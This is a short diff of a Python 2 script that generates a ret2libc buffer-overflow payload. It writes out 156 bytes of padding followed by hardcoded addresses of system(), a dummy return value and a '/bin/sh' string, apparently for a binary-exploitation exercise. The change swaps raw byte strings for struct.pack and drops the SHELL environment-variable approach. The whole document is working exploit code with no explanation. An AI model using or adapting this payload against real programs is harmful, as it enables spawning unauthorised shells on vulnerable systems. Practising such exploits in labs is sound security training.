@@ -1,7 +1,7 @@
-# Make sure to change the SHELL environment variable to container the string "/bin/sh"
+import struct
 
-system_addr = "\xd0\xae\xe6\xf7"
-exit_addr = "\x70\xeb\xe5\xf7"
-shell_addr = "\xec\x97\xf8\xf7"
+system_addr = struct.pack('I', 0xf7e6aed0)
+bin_sh_addr = struct.pack('I', 0xf7f897ec)
+return_dummy = "OMOK"
 
-print "A" * 156 + system_addr + exit_addr + shell_addr
+print "A" * 156 + system_addr + return_dummy + bin_sh_addr
